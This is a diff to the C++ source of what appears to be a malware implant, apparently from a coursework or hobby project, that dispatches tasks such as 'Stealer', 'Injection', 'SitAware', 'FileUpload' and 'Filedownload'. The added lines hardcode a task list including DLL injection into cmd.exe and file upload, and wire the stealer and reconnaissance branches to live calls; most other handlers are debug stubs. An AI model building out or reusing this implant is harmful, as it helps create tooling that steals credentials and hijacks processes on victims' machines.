@@ -6,6 +6,7 @@
 #include <iostream>
 #include "..\Feiyu\Injection.h"
 #include "..\Feiyu\GatherInfo.h"
+#include "..\Feiyu\Dropper.h"
 
 //#include "..\HTTPstuff.h"
 
@@ -144,7 +145,14 @@ std::string exec(char* program, char* args){
 
 int parseArgs(){
     //std::string t = {R"([{\"command\": \"Stealer\", \"args\": \"\"}, {\"command\": \"FileExec\", \"args\": \"LaLa.exe\"} ])"};
-    json response = json::parse("[{\"command\": \"Stealer\", \"args\": \"\"}, {\"command\": \"FileExec\", \"args\": \"LaLa.exe\"} ]");
+    json response = json::parse("[{\"command\": \"Stealer\", \"args\": \"\"},"
+    " {\"command\": \"FileExec\", \"args\": \"C:\\Windows\\System32\\whoami.exe \\user\"}, "
+    " {\"command\": \"SitAware\", \"args\": \"\"}, "
+    " {\"command\": \"Injection\", \"args\": \"L\"cmd.exe\" \"C:\\Users\\53444\\Downloads\\Simple-DLL-Injection-master\\C++\\x64\\Release\\testlib.dll\" L\"testlib.dll\"}, "
+    " {\"command\": \"FileUpload\", \"args\": \"C:\\malware\\ch0nky.txt\"}, "
+    " {\"command\": \"Filedownload\", \"args\": \"LaLa.exe\"}, "
+    " {\"command\": \"Fileenum\", \"args\": \"LaLa.exe\"} "
+    " ]");
     printf("In parse\n");
    
     std::cout << response << '\n';
@@ -159,9 +167,11 @@ int parseArgs(){
         std::cout << command <<"\n";
          std::string args = response.at(i).at("args");
         std::cout << args << "\n";
+        json res;
         if (command.compare("Stealer") == 0){
             printf("in stealer \n");
-            //json res = driver();
+             res = driver();
+             std::cout << res;
             //perform error checking then post
 
 
@@ -171,14 +181,20 @@ int parseArgs(){
             printf("in fileexec\n");
 
         } else if (command.compare("SitAware") == 0) {
+             res = GetAll();
+             std::cout << res;
 
         } else if (command.compare("FileEnum") == 0){
+            printf("WHERE IS THIS???\n");
 
         } else if (command.compare("Injection") == 0){
+            printf("INJECTION\n");
 
         } else if (command.compare("FileUpload") == 0) {
+            printf("UPLOAD\n");
 
         } else if (command.compare("Filedownload") == 0){
+            printf("DOWNLOAD\n");
             
             
         } else {
